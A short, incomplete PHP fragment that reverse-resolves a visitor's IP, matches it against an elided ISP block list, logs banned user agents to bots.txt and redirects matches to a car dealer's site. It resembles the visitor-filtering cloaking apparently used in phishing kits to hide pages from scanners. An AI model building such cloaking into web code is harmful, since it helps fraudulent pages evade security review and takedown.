...
$ispsys = gethostbyaddr($_SERVER['REMOTE_ADDR']);
...
$isp_block = array(
    ...
    foreach ($isp_block as $isps) {
        if (substr_count($ispsys, $isps) > 0) {
           $data = "#> ".$_SERVER['HTTP_USER_AGENT']." [ ISP Ban ] \r\n";
            $save=fopen("../bots.txt","a+");
            fwrite($save,$data);
            fclose($save);
            header("Location: https://www.superhonda.com/");
